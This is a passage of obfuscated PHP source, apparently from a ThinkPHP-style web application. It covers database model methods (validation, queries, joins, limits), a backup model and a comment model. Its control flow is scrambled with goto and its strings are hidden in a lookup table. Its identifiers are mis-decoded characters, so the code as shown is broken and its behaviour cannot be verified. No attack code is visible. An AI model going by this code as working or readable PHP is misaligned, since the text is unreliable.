$fêÃ·πû£ñ[328]: if (is_string($f«˘¶ïÌÑã[0]) && strpos($f«˘¶ïÌÑã[0], $fêÃ·πû£ñ[47])) { $f«˘¶ïÌÑã[0] = explode($fêÃ·πû£ñ[47], $f«˘¶ïÌÑã[0]); } $Aú∆ÍØÓå≈ = array(); if (is_array($f«˘¶ïÌÑã[0])) { foreach ($f«˘¶ïÌÑã[0] as $B £ó∑Òá◊) { $Aú∆ÍØÓå≈[$B £ó∑Òá◊] = $C÷ÈÔ§ÀﬁÕ[$B £ó∑Òá◊]; } } else { $Aú∆ÍØÓå≈[$f«˘¶ïÌÑã[0]] = $C÷ÈÔ§ÀﬁÕ[$f«˘¶ïÌÑã[0]]; } if (!empty($C÷ÈÔ§ÀﬁÕ[$this->getPk()])) { $Aú∆ÍØÓå≈[$this->getPk()] = array($fêÃ·πû£ñ[329], $C÷ÈÔ§ÀﬁÕ[$this->getPk()]); } if ($this->where($Aú∆ÍØÓå≈)->find()) { return !1; } return !0; default: return $this->check($C÷ÈÔ§ÀﬁÕ[$f«˘¶ïÌÑã[0]], $f«˘¶ïÌÑã[1], $f«˘¶ïÌÑã[4]); } } public function check($E™®Úú®√®, $aßÔÖ©°Á¬, $b—Ñß¿≈éﬁ = "\x72\145\147\x65\x78") { $e√áêâ±Æ  =& $_SERVER[ú∫]; $b—Ñß¿≈éﬁ = strtolower(trim($b—Ñß¿≈éﬁ)); switch ($b—Ñß¿≈éﬁ) { case $e√áêâ±Æ [7]: case $e√áêâ±Æ [330]: $c∑§ãˆ¢ä’ = is_array($aßÔÖ©°Á¬) ? $aßÔÖ©°Á¬ : explode($e√áêâ±Æ [47], $aßÔÖ©°Á¬); return $b—Ñß¿≈éﬁ == $e√áêâ±Æ [7] ? in_array($E™®Úú®√®, $c∑§ãˆ¢ä’) : !in_array($E™®Úú®√®, $c∑§ãˆ¢ä’); case $e√áêâ±Æ [331]: case $e√áêâ±Æ [332]: if (is_array($aßÔÖ©°Á¬)) { $f«‰¢åﬂ∂Ò = $aßÔÖ©°Á¬[0]; $F–º«ÆÒàˆ = $aßÔÖ©°Á¬[1]; } else { list($f«‰¢åﬂ∂Ò, $F–º«ÆÒàˆ) = explode($e√áêâ±Æ [47], $aßÔÖ©°Á¬); } return $b—Ñß¿≈éﬁ == $e√áêâ±Æ [331] ? $E™®Úú®√® >= $f«‰¢åﬂ∂Ò && $E™®Úú®√® <= $F–º«ÆÒàˆ : $E™®Úú®√® < $f«‰¢åﬂ∂Ò || $E™®Úú®√® > $F–º«ÆÒàˆ; case $e√áêâ±Æ [333]: case $e√áêâ±Æ [334]: return $b—Ñß¿≈éﬁ == $e√áêâ±Æ [333] ? $E™®Úú®√® == $aßÔÖ©°Á¬ : $E™®Úú®√® != $aßÔÖ©°Á¬; case $e√áêâ±Æ [335]: $Bâ ±€Ñ’ñ = mb_strlen($E™®Úú®√®, $e√áêâ±Æ [336]); if (strpos($aßÔÖ©°Á¬, $e√áêâ±Æ [47])) { list($f«‰¢åﬂ∂Ò, $F–º«ÆÒàˆ) = explode($e√áêâ±Æ [47], $aßÔÖ©°Á¬); return $Bâ ±€Ñ’ñ >= $f«‰¢åﬂ∂Ò && $Bâ ±€Ñ’ñ <= $F–º«ÆÒàˆ; } else { return $Bâ ±€Ñ’ñ == $aßÔÖ©°Á¬; } case $e√áêâ±Æ [337]: list($aòÊ›Èç ¨, $E†èÿÂªøÔ) = explode($e√áêâ±Æ [47], $aßÔÖ©°Á¬); if (!is_numeric($aòÊ›Èç ¨)) { $aòÊ›Èç ¨ = strtotime($aòÊ›Èç ¨); } if (!is_numeric($E†èÿÂªøÔ)) { $E†èÿÂªøÔ = strtotime($E†èÿÂªøÔ); } return NOW_TIME >= $aòÊ›Èç ¨ && NOW_TIME <= $E†èÿÂªøÔ; case $e√áêâ±Æ [338]: return in_array(get_client_ip(), explode($e√áêâ±Æ [47], $aßÔÖ©°Á¬)); case $e√áêâ±Æ [339]: return !in_array(get_client_ip(), explode($e√áêâ±Æ [47], $aßÔÖ©°Á¬)); case $e√áêâ±Æ [326]: default: return $this->regex($E™®Úú®√®, $aßÔÖ©°Á¬); } } public function query($eΩãÇ÷ÌàÎ, $EÕáÊëã›ç = false) { $FÜ∏ﬂàÌªı =& $_SERVER[ú∫]; if (!is_bool($EÕáÊëã›ç) && !is_array($EÕáÊëã›ç)) { $EÕáÊëã›ç = func_get_args(); array_shift($EÕáÊëã›ç); } $eΩãÇ÷ÌàÎ = str_replace(array($FÜ∏ﬂàÌªı[229], $FÜ∏ﬂàÌªı[340]), $FÜ∏ﬂàÌªı[50], $eΩãÇ÷ÌàÎ); $eΩãÇ÷ÌàÎ = $this->parseSql($eΩãÇ÷ÌàÎ, $EÕáÊëã›ç); return $this->db->query($eΩãÇ÷ÌàÎ); } public function execute($D£Ç·ﬂ‡¥†, $FæÛì‚Ó€ƒ = false) { if (!is_bool($FæÛì‚Ó€ƒ) && !is_array($FæÛì‚Ó€ƒ)) { $FæÛì‚Ó€ƒ = func_get_args(); array_shift($FæÛì‚Ó€ƒ); } $D£Ç·ﬂ‡¥† = $this->parseSql($D£Ç·ﬂ‡¥†, $FæÛì‚Ó€ƒ); return $this->db->execute($D£Ç·ﬂ‡¥†); } protected function parseSql($A„®¨»¨Ù , $e–ó§ä»õ–) { $câπÛŒΩ∏… =& $_SERVER[ú∫]; if (!0 === $e–ó§ä»õ–) { $e¢Ö‡áÿÃÃ = $this->_parseOptions(); $A„®¨»¨Ù  = $this->db->parseSql($A„®¨»¨Ù , $e¢Ö‡áÿÃÃ); } elseif (is_array($e–ó§ä»õ–)) { $e–ó§ä»õ– = array_map(array($this->db, $câπÛŒΩ∏…[341]), $e–ó§ä»õ–); $A„®¨»¨Ù  = vsprintf($A„®¨»¨Ù , $e–ó§ä»õ–); } else { $A„®¨»¨Ù  = strtr($A„®¨»¨Ù , array($câπÛŒΩ∏…[342] => $this->getTableName(), $câπÛŒΩ∏…[343] => think_config($câπÛŒΩ∏…[242]))); } $this->db->setModel($this->name); return $A„®¨»¨Ù ; } public function db($DÑ¿ò•Ó”” = '', $AÕ£‡‚ÛêÆ = '', $e¯Õõ∫´´Î = array()) { goto B´§˜´Ó°”; aõãﬂéù◊à: $aΩíÍ¿üΩ›[$DÑ¿ò•Ó””] = $AÕ£‡‚ÛêÆ; $this->db = $eë ¡¢ÉâÚ[$DÑ¿ò•Ó””]; $this->_after_db(); goto aºÂæœ◊ûÑ; B´§˜´Ó°”: $c¯ÈäÎµºÒ =& $_SERVER[ú∫]; if ($c¯ÈäÎµºÒ[33] === $DÑ¿ò•Ó”” && $this->db) { return $this->db; } static $aΩíÍ¿üΩ› = array(); goto AŸëõò«∂Œ; AŸëõò«∂Œ: static $eë ¡¢ÉâÚ = array(); if (!isset($eë ¡¢ÉâÚ[$DÑ¿ò•Ó””]) || isset($eë ¡¢ÉâÚ[$DÑ¿ò•Ó””]) && $AÕ£‡‚ÛêÆ && $aΩíÍ¿üΩ›[$DÑ¿ò•Ó””] != $AÕ£‡‚ÛêÆ) { if (!empty($AÕ£‡‚ÛêÆ) && is_string($AÕ£‡‚ÛêÆ) && !1 === strpos($AÕ£‡‚ÛêÆ, $c¯ÈäÎµºÒ[8])) { $AÕ£‡‚ÛêÆ = think_config($AÕ£‡‚ÛêÆ); } $eë ¡¢ÉâÚ[$DÑ¿ò•Ó””] = Db::getInstance($AÕ£‡‚ÛêÆ); } elseif (NULL === $AÕ£‡‚ÛêÆ) { $eë ¡¢ÉâÚ[$DÑ¿ò•Ó””]->close(); unset($eë ¡¢ÉâÚ[$DÑ¿ò•Ó””]); return; } if (!empty($e¯Õõ∫´´Î)) { if (is_string($e¯Õõ∫´´Î)) { parse_str($e¯Õõ∫´´Î, $e¯Õõ∫´´Î); } foreach ($e¯Õõ∫´´Î as $Eó‹ë’“äû => $aèÇ“ä◊≠) { $this->setProperty($Eó‹ë’“äû, $aèÇ“ä◊≠); } } goto aõãﬂéù◊à; aºÂæœ◊ûÑ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto BŸ¥¨Æé£; BŸ¥¨Æé£: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $aÀ∏Üãâ˜º = get_class($this); if ($aÀ∏Üãâ˜º == $_SERVER[ú∫][344]) { return $this->name; } $this->name = substr($aÀ∏Üãâ˜º, 0, -5); } return $this->name; } public function getTableName() { $e◊©ëã•≥ƒ =& $_SERVER[ú∫]; if (empty($this->trueTableName)) { $a¨Æë¶«Úò = !empty($this->tablePrefix) ? $this->tablePrefix : $e◊©ëã•≥ƒ[33]; if (!empty($this->tableName)) { $a¨Æë¶«Úò .= $this->tableName; } else { $a¨Æë¶«Úò .= think_parse_name($this->name); } $this->trueTableName = strtolower($a¨Æë¶«Úò); } return (!empty($this->dbName) ? $this->dbName . $e◊©ëã•≥ƒ[95] : $e◊©ëã•≥ƒ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $CæçŸåÜèÆ =& $_SERVER[ú∫]; return isset($this->fields[$CæçŸåÜèÆ[249]]) ? $this->fields[$CæçŸåÜèÆ[249]] : $this->pk; } public function getDbFields() { $DÎΩ’ﬁ¶Á≥ =& $_SERVER[ú∫]; if (isset($this->options[$DÎΩ’ﬁ¶Á≥[277]])) { $B‹›–ÃÆÑÇ = $this->db->getFields($this->options[$DÎΩ’ﬁ¶Á≥[277]]); return $B‹›–ÃÆÑÇ ? array_keys($B‹›–ÃÆÑÇ) : !1; } if ($this->fields) { $B‹›–ÃÆÑÇ = $this->fields; unset($B‹›–ÃÆÑÇ[$DÎΩ’ﬁ¶Á≥[248]], $B‹›–ÃÆÑÇ[$DÎΩ’ﬁ¶Á≥[249]], $B‹›–ÃÆÑÇ[$DÎΩ’ﬁ¶Á≥[250]], $B‹›–ÃÆÑÇ[$DÎΩ’ﬁ¶Á≥[247]]); return $B‹›–ÃÆÑÇ; } return !1; } public function data($d‚÷™Ωä‘â = '') { $Cù€â¬›¯å =& $_SERVER[ú∫]; if ($Cù€â¬›¯å[33] === $d‚÷™Ωä‘â && !empty($this->data)) { return $this->data; } if (is_object($d‚÷™Ωä‘â)) { $d‚÷™Ωä‘â = get_object_vars($d‚÷™Ωä‘â); } elseif (is_string($d‚÷™Ωä‘â)) { parse_str($d‚÷™Ωä‘â, $d‚÷™Ωä‘â); } elseif (!is_array($d‚÷™Ωä‘â)) { think_exception(think_lang($Cù€â¬›¯å[269])); } $this->data = $d‚÷™Ωä‘â; return $this; } public function join($CçæÍ »°©) { $aÒ∏Ωû¥‡» =& $_SERVER[ú∫]; if (is_array($CçæÍ »°©)) { $this->options[$aÒ∏Ωû¥‡»[280]] = $CçæÍ »°©; } elseif (!empty($CçæÍ »°©)) { $this->options[$aÒ∏Ωû¥‡»[280]][] = $CçæÍ »°©; } return $this; } public function union($Fü˜∂√≈∑û, $A©‡’Ç‹á≥ = false) { goto c‚Ü∞»ƒ¥‰; c‚Ü∞»ƒ¥‰: $dëëÈ≠öŸÖ =& $_SERVER[ú∫]; if (empty($Fü˜∂√≈∑û)) { return $this; } if ($A©‡’Ç‹á≥) { $this->options[$dëëÈ≠öŸÖ[345]][$dëëÈ≠öŸÖ[346]] = !0; } goto Aƒ∫‰õ»´Ó; f–ä÷Í‚ÛÌ: return $this; goto a≈üâﬁ˜œç; Aƒ∫‰õ»´Ó: if (is_object($Fü˜∂√≈∑û)) { $Fü˜∂√≈∑û = get_object_vars($Fü˜∂√≈∑û); } if (is_string($Fü˜∂√≈∑û)) { $eÏøà…Â≥˜ = $Fü˜∂√≈∑û; } elseif (is_array($Fü˜∂√≈∑û)) { if (isset($Fü˜∂√≈∑û[0])) { $this->options[$dëëÈ≠öŸÖ[345]] = array_merge($this->options[$dëëÈ≠öŸÖ[345]], $Fü˜∂√≈∑û); return $this; } else { $eÏøà…Â≥˜ = $Fü˜∂√≈∑û; } } else { think_exception(think_lang($dëëÈ≠öŸÖ[269])); } $this->options[$dëëÈ≠öŸÖ[345]][] = $eÏøà…Â≥˜; goto f–ä÷Í‚ÛÌ; a≈üâﬁ˜œç: } public function cache($cûÎ†à‘¬« = true, $f»ôÌΩËπ∫ = null, $cÀîÈëª¥á = '') { $fã¢∏ÆÏ±ä =& $_SERVER[ú∫]; if (!1 !== $cûÎ†à‘¬«) { $this->options[$fã¢∏ÆÏ±ä[347]] = array($fã¢∏ÆÏ±ä[93] => $cûÎ†à‘¬«, $fã¢∏ÆÏ±ä[337] => $f»ôÌΩËπ∫, $fã¢∏ÆÏ±ä[29] => $cÀîÈëª¥á); } return $this; } public function field($d∆ÁñƒÎèö, $A®á…à“êƒ = false) { $D¨ÒÖ≈Ìâµ =& $_SERVER[ú∫]; if (!0 === $d∆ÁñƒÎèö) { $C„ÉÆÇÏ¯Î = $this->getDbFields(); $d∆ÁñƒÎèö = $C„ÉÆÇÏ¯Î ? $C„ÉÆÇÏ¯Î : $D¨ÒÖ≈Ìâµ[182]; } elseif ($A®á…à“êƒ) { if (is_string($d∆ÁñƒÎèö)) { $d∆ÁñƒÎèö = explode($D¨ÒÖ≈Ìâµ[47], $d∆ÁñƒÎèö); } $C„ÉÆÇÏ¯Î = $this->getDbFields(); $d∆ÁñƒÎèö = $C„ÉÆÇÏ¯Î ? array_diff($C„ÉÆÇÏ¯Î, $d∆ÁñƒÎèö) : $d∆ÁñƒÎèö; } $this->options[$D¨ÒÖ≈Ìâµ[271]] = $d∆ÁñƒÎèö; return $this; } public function scope($aΩ‘êÈÁ◊© = '', $Bà¥›≤ıö´ = NULL) { $EÁ–’¶£’ß =& $_SERVER[ú∫]; if ($EÁ–’¶£’ß[33] === $aΩ‘êÈÁ◊©) { if (isset($this->_scope[$EÁ–’¶£’ß[34]])) { $f‹„ ∏†Ú› = $this->_scope[$EÁ–’¶£’ß[34]]; } else { return $this; } } elseif (is_string($aΩ‘êÈÁ◊©)) { $aªˆÀﬂï∏£ = explode($EÁ–’¶£’ß[47], $aΩ‘êÈÁ◊©); $f‹„ ∏†Ú› = array(); foreach ($aªˆÀﬂï∏£ as $bà˘ÙÖ—É·) { if (!isset($this->_scope[$bà˘ÙÖ—É·])) { continue; } $f‹„ ∏†Ú› = array_merge($f‹„ ∏†Ú›, $this->_scope[$bà˘ÙÖ—É·]); } if (!empty($Bà¥›≤ıö´) && is_array($Bà¥›≤ıö´)) { $f‹„ ∏†Ú› = array_merge($f‹„ ∏†Ú›, $Bà¥›≤ıö´); } } elseif (is_array($aΩ‘êÈÁ◊©)) { $f‹„ ∏†Ú› = $aΩ‘êÈÁ◊©; } if (is_array($f‹„ ∏†Ú›) && !empty($f‹„ ∏†Ú›)) { $this->options = array_merge($this->options, array_change_key_case($f‹„ ∏†Ú›)); } return $this; } public function where($F¨ıÚ≈¬Ù√, $a∂ÖÇ∫ù»® = null) { $f„åú∑Ï∫¶ =& $_SERVER[ú∫]; if (!is_null($a∂ÖÇ∫ù»®) && is_string($F¨ıÚ≈¬Ù√)) { if (!is_array($a∂ÖÇ∫ù»®)) { $a∂ÖÇ∫ù»® = func_get_args(); array_shift($a∂ÖÇ∫ù»®); } $a∂ÖÇ∫ù»® = array_map(array($this->db, $f„åú∑Ï∫¶[341]), $a∂ÖÇ∫ù»®); $F¨ıÚ≈¬Ù√ = vsprintf($F¨ıÚ≈¬Ù√, $a∂ÖÇ∫ù»®); } elseif (is_object($F¨ıÚ≈¬Ù√)) { $F¨ıÚ≈¬Ù√ = get_object_vars($F¨ıÚ≈¬Ù√); } elseif (is_array($F¨ıÚ≈¬Ù√)) { foreach ($F¨ıÚ≈¬Ù√ as $AÕﬁâ˜ΩÍæ => $D£Ω¢Ê≠æü) { if ((is_numeric($AÕﬁâ˜ΩÍæ) || !$AÕﬁâ˜ΩÍæ) && is_string($D£Ω¢Ê≠æü)) { if (strpos($D£Ω¢Ê≠æü, $f„åú∑Ï∫¶[348]) === 0) { continue; } think_trace($f„åú∑Ï∫¶[349], $f„åú∑Ï∫¶[33], $f„åú∑Ï∫¶[46]); die; } } } if (is_string($F¨ıÚ≈¬Ù√) && $f„åú∑Ï∫¶[33] != $F¨ıÚ≈¬Ù√) { $eÊ÷¯ãº©Ú = array(); $eÊ÷¯ãº©Ú[$f„åú∑Ï∫¶[350]] = $F¨ıÚ≈¬Ù√; $F¨ıÚ≈¬Ù√ = $eÊ÷¯ãº©Ú; } if (isset($this->options[$f„åú∑Ï∫¶[273]])) { $this->options[$f„åú∑Ï∫¶[273]] = array_merge($this->options[$f„åú∑Ï∫¶[273]], $F¨ıÚ≈¬Ù√); } else { $this->options[$f„åú∑Ï∫¶[273]] = $F¨ıÚ≈¬Ù√; } return $this; } public function limit($f∏’ıêç÷∂, $fá”ã¨’«ê = null) { $e•√È·õìØ =& $_SERVER[ú∫]; $this->options[$e•√È·õìØ[290]] = is_null($fá”ã¨’«ê) ? $f∏’ıêç÷∂ : $f∏’ıêç÷∂ . $e•√È·õìØ[47] . $fá”ã¨’«ê; return $this; } public function page($B∞çﬁÍåÍå, $E ≈óã‡Òó = null) { $dˆÆé≥µ”§ =& $_SERVER[ú∫]; $this->options[$dˆÆé≥µ”§[351]] = is_null($E ≈óã‡Òó) ? $B∞çﬁÍåÍå : $B∞çﬁÍåÍå . $dˆÆé≥µ”§[47] . $E ≈óã‡Òó; return $this; } public function comment($eä¬«É÷°∫) { $this->options[$_SERVER[ú∫][352]] = $eä¬«É÷°∫; return $this; } public function setProperty($E—ÚÌÔÑèº, $D æîÔŸÌ›) { if (property_exists($this, $E—ÚÌÔÑèº)) { $this->{$E—ÚÌÔÑèº} = $D æîÔŸÌ›; } return $this; } } goto EÑÜ…‚”úñ; DéÑ“Ù‘Á‡: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\142\141\x63\x6b\165\x70\x4c\151\x73\164"; public $field = array("\x69\x6f", "\x6e\141\x6d\x65", "\163\164\141\x74\x75\163", "\143\x6f\156\x74\x65\x6e\x74", "\155\141\x6e\165\x61\154", "\162\145\x73\x75\154\164", "\x74\151\155\x65\106\x72\x6f\155", "\x74\151\x6d\x65\124\157"); public function config() { goto a‘†âö¡ÍÖ; a‘†âö¡ÍÖ: $Aé√É¡·ôÍ =& $_SERVER[ú∫]; $B†Èªè‹ì = Model($Aé√É¡·ôÍ[730])->get($Aé√É¡·ôÍ[742]); $B†Èªè‹ì = json_decode($B†Èªè‹ì, !0); goto f‡®ƒÕúé”; dΩú‡·∏†—: if (isset($B†Èªè‹ì[$Aé√É¡·ôÍ[197]])) { $B–≠Ã†óä˜[$Aé√É¡·ôÍ[197]][$Aé√É¡·ôÍ[1502]] = $B†Èªè‹ì[$Aé√É¡·ôÍ[197]]; unset($B†Èªè‹ì[$Aé√É¡·ôÍ[197]]); } return array_merge($B–≠Ã†óä˜, $B†Èªè‹ì); goto bîÉ¢„€≈≈; f‡®ƒÕúé”: $B†Èªè‹ì = is_array($B†Èªè‹ì) ? $B†Èªè‹ì : array(); if (!isset($B†Èªè‹ì[$Aé√É¡·ôÍ[715]])) { $B†Èªè‹ì[$Aé√É¡·ôÍ[715]] = $Aé√É¡·ôÍ[87]; } unset($B†Èªè‹ì[$Aé√É¡·ôÍ[1499]]); goto fÑﬁÌœøÉ»; cª¨µõﬂõﬂ: $B–≠Ã†óä˜ = Model($Aé√É¡·ôÍ[1718])->findByKey($Aé√É¡·ôÍ[1517], $Eßäµå≤ª ); if (!$B–≠Ã†óä˜) { $B–≠Ã†óä˜ = array(); } if (isset($B–≠Ã†óä˜[$Aé√É¡·ôÍ[197]])) { $B–≠Ã†óä˜[$Aé√É¡·ôÍ[197]] = json_decode($B–≠Ã†óä˜[$Aé√É¡·ôÍ[197]], !0); } goto dΩú‡·∏†—; fÑﬁÌœøÉ»: Action($Aé√É¡·ôÍ[1716])->taskInit(); Model($Aé√É¡·ôÍ[1498])->cacheClear(); $Eßäµå≤ª  = $Aé√É¡·ôÍ[1717]; goto cª¨µõﬂõﬂ; bîÉ¢„€≈≈: } public function listData($D∆Ôá»˜’Ë = false, $cóãá„·ÿÇ = "\155\157\144\x69\146\171\x54\x69\x6d\145", $FóÂä£–ï® = false) { return parent::listData($D∆Ôá»˜’Ë, $cóãá„·ÿÇ, !0); } public function lastItem() { $fõûâ¯Ñîø = $this->listData(); return !empty($fõûâ¯Ñîø[0]) ? $fõûâ¯Ñîø[0] : null; } public function kill($BÍË∑“†ÉÊ) { goto fΩØäŸÈú©; fΩØäŸÈú©: $cïôÕºËáü =& $_SERVER[ú∫]; $C°™Ò“îú« = $this->listData($BÍË∑“†ÉÊ); if (!$C°™Ò“îú« || empty($C°™Ò“îú«[$cïôÕºËáü[28]])) { return !0; } goto bëÂﬁƒ€Ω«; C¥ﬁÆ∞Ü¯Ô: $AçŸÒ‘“Ëƒ = $C°™Ò“îú«[$cïôÕºËáü[28]]; $a‹ô¥“ã˘â = TEMP_FILES . $cïôÕºËáü[738] . $AçŸÒ‘“Ëƒ . $cïôÕºËáü[8]; IO::remove($a‹ô¥“ã˘â, !1); goto b•‡≥≥ÖïÜ; b•‡≥≥ÖïÜ: return $this->remove($BÍË∑“†ÉÊ); goto d–„Â§Í√ë; bëÂﬁƒ€Ω«: Task::kill($cïôÕºËáü[741]); Task::kill($cïôÕºËáü[764]); Task::kill($cïôÕºËáü[774]); goto C¥ﬁÆ∞Ü¯Ô; d–„Â§Í√ë: } public function remove($e‹›û∫‹ﬂÛ) { $d∏Œ€ñ¯û = $this->listData($e‹›û∫‹ﬂÛ); if (!$d∏Œ€ñ¯û) { return !0; } return $this->backupRemove($d∏Œ€ñ¯û); } private function backupRemove($c¬›Î «œ‚) { parent::remove($c¬›Î «œ‚[$_SERVER[ú∫][393]]); $aûÏëóÔõ¶ = $this->backupPath($c¬›Î «œ‚); IO::remove($aûÏëóÔõ¶, !1); return !0; } private function backupPath($f–©ôºŸ©) { $eæÒäŒÏÛﬂ =& $_SERVER[ú∫]; $D‰™ç“…«÷ = $f–©ôºŸ©[$eæÒäŒÏÛﬂ[28]]; $E¢‚—ÃÉ»≥ = Model($eæÒäŒÏÛﬂ[730])->get($eæÒäŒÏÛﬂ[731]); $aé«ﬂ¢£ó∫ = substr(md5($eæÒäŒÏÛﬂ[732] . $E¢‚—ÃÉ»≥ . $D‰™ç“…«÷), 0, 8); return "\x7b\151\x6f\72{$f–©ôºŸ©[$eæÒäŒÏÛﬂ[712]]}\x7d\x2f\144\x61\164\141\142\141\x73\x65\57\x62\x61\143\153\x75\160\x2f" . $D‰™ç“…«÷ . $eæÒäŒÏÛﬂ[71] . $aé«ﬂ¢£ó∫; } public function start() { goto Eæ÷≠‘Çƒ—; Eæ÷≠‘Çƒ—: $E‹è€Ω≥‘˘ =& $_SERVER[ú∫]; if ($GLOBALS[$E‹è€Ω≥‘˘[6]][$E‹è€Ω≥‘˘[88]][$E‹è€Ω≥‘˘[1719]] != $E‹è€Ω≥‘˘[87]) { return !0; } $d€‡‹ﬂ ∂Ó = $this->config(); goto cã‚Ô√≤˜ÿ; B´∑äÛ¶§µ: Backup::set(array($E‹è€Ω≥‘˘[710] => 1, $E‹è€Ω≥‘˘[476] => time())); return !0; goto E∑ç≤ÌÖ˘è; cã‚Ô√≤˜ÿ: if (!$d€‡‹ﬂ ∂Ó || $d€‡‹ﬂ ∂Ó[$E‹è€Ω≥‘˘[1499]] != $E‹è€Ω≥‘˘[87]) { return !1; } $F¶á∑˜êﬂ≤ = $this->process(); foreach ($F¶á∑˜êﬂ≤ as $Dë«ÕÆ∂∂) { if ($Dë«ÕÆ∂∂) { return Task::restart($Dë«ÕÆ∂∂[$E‹è€Ω≥‘˘[393]]); } } goto E…ãœäÒÿ∏; E…ãœäÒÿ∏: $aèÇ€œ®ˆö = new Backup(); $c´èñ‚≈ºû = $aèÇ€œ®ˆö->db(); if ($c´èñ‚≈ºû) { $c´èñ‚≈ºû = $aèÇ€œ®ˆö->dbFile(); if ($c´èñ‚≈ºû && $d€‡‹ﬂ ∂Ó[$E‹è€Ω≥‘˘[715]] == $E‹è€Ω≥‘˘[191]) { $c´èñ‚≈ºû = $aèÇ€œ®ˆö->file(); } } goto B´∑äÛ¶§µ; E∑ç≤ÌÖ˘è: } public function process() { $Dæ Œ≥¶›• =& $_SERVER[ú∫]; return array($Dæ Œ≥¶›•[718] => Task::get($Dæ Œ≥¶›•[741]), $Dæ Œ≥¶›•[722] => Task::get($Dæ Œ≥¶›•[764]), $Dæ Œ≥¶›•[193] => Task::get($Dæ Œ≥¶›•[774])); } public function restore() { $Cı™ñ Ü¶© =& $_SERVER[ú∫]; ActionCall($Cı™ñ Ü¶©[1018], !0, 1); ActionCall($Cı™ñ Ü¶©[1018], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\x65\x6e\164"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\x6d\145" => "\x63\157\x6d\x6d\145\x6e\x74\137\155\x65\164\141", "\x6d\145\x74\x61\x46\x69\x65\x6c\144" => "\143\157\x6d\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($fƒàà£å¶Ø) { $cæá≤‚äπ— =& $_SERVER[ú∫]; if ($fƒàà£å¶Ø[$cæá≤‚äπ—[1720]]) { $düúï…üâõ = $this->where(array($cæá≤‚äπ—[1721] => $fƒàà£å¶Ø[$cæá≤‚äπ—[1720]]))->find(); if (!$düúï…üâõ || $düúï…üâõ[$cæá≤‚äπ—[404]] != $fƒàà£å¶Ø[$cæá≤‚äπ—[404]] || $düúï…üâõ[$cæá≤‚äπ—[484]] != $fƒàà£å¶Ø[$cæá≤‚äπ—[484]]) { return !1; } $this->where(array($cæá≤‚äπ—[1721] => $fƒàà£å¶Ø[$cæá≤‚äπ—[1720]]))->setAdd($cæá≤‚äπ—[1722], 1); } $fƒàà£å¶Ø[$cæá≤‚äπ—[1723]] = 0; $fƒàà£å¶Ø[$cæá≤‚äπ—[1722]] = 0; $fƒàà£å¶Ø[$cæá≤‚äπ—[710]] = 1; return $this->add($fƒàà£å¶Ø); } public function commentCount($f„∂∫„á»Ó, $dñ÷Ù™®Âê) { goto A™ºÖò’Õ∆; CŒıè…áå´: return array_to_keyvalue($fΩ‚ıÚÙ±, $BçπÚ  ï›[484], $BçπÚ  ï›[480]); goto D¯≥—ºÒò; A™ºÖò’Õ∆: $BçπÚ  ï› =& $_SERVER[ú∫]; if (!$f„∂∫„á»Ó) { return array(); } if (is_string($f„∂∫„á»Ó) || is_int($f„∂∫„á»Ó)) { $f„∂∫„á»Ó = array($f„∂∫„á»Ó); } goto AàÕçœ«“Á; AàÕçœ«“Á: $AåëÜÍ´±ö = array($BçπÚ  ï›[484], $BçπÚ  ï›[1724] => $BçπÚ  ï›[480]); $E¢€≈óµ‰≈ = array($BçπÚ  ï›[484] => array($BçπÚ  ï›[7], $f„∂∫„á»Ó), $BçπÚ  ï›[404] => $dñ÷Ù™®Âê); $fΩ‚ıÚÙ± = $this->field($AåëÜÍ´±ö)->where($E¢€≈óµ‰≈)->group($BçπÚ  ï›[484])->select(); goto CŒıè…áå´; D¯≥—ºÒò: } public function remove($eŸ›ïµêºã) { $eôµ…êæ”√ =& $_SERVER[ú∫]; $E—ﬂ¯åÂÌÒ = array($eôµ…êæ”√[1721] => $eŸ›ïµêºã); $dèàÀ“Ò£ˆ = $this->where($E—ﬂ¯åÂÌÒ)->find(); if ($dèàÀ“Ò£ˆ[$eôµ…êæ”√[1720]]) { $this->where(array($eôµ…êæ”√[1721] => $dèàÀ“Ò£ˆ[$eôµ…êæ”√[1720]]))->setAdd($eôµ…êæ”√[1722], -1); } return $this->where($E—ﬂ¯åÂÌÒ)->delete(); } public function edit($cÏ≈à∏Âó“, $A∂∏¡¨ë–Æ) { $cÂè«Ñ‡Î⁄ =& $_SERVER[ú∫]; $dÈåÁáÌÈƒ = array($cÂè«Ñ‡Î⁄[1721] => $cÏ≈à∏Âó“); return $this->where($dÈåÁáÌÈƒ)->save(array($cÂè«Ñ‡Î⁄[1725] => $A∂∏¡¨ë–Æ)); } public function prasise($bçÍßö∆œÍ) { $B ‘„õÉ•¡ =& $_SERVER[ú∫]; $b‘´⁄’∏≤ú = Model($B ‘„õÉ•¡[1726]); $A‹ß…ÜòÆÚ = array($B ‘„õÉ•¡[1721] => $bçÍßö∆œÍ, $B ‘„õÉ•¡[1520] => USER_ID); $eñíö§·ﬁ¥ = $b‘´⁄’∏≤ú->where($A‹ß…ÜòÆÚ)->find(); if (!$eñíö§·ﬁ¥) { $b‘´⁄’∏≤ú->add($A‹ß…ÜòÆÚ); $dÍÃæêÌÒò = $this->where(array($B ‘„õÉ•¡[1721] => $bçÍßö∆œÍ))->setAdd($B ‘„õÉ•¡[1723], 1); } else { $b‘´⁄’∏≤ú->where($A‹ß…ÜòÆÚ)->delete(); $dÍÃæêÌÒò = $this->where(array($B ‘„õÉ•¡[1721] => $bçÍßö∆œÍ))->setAdd($B ‘„õÉ•¡[1723], -1); } return $dÍÃæêÌÒò; } public function targetInfo($DΩïÿô‘â…, $f◊¶ÌßÑÌÆ) { goto Bú≤ΩÿßîŸ; 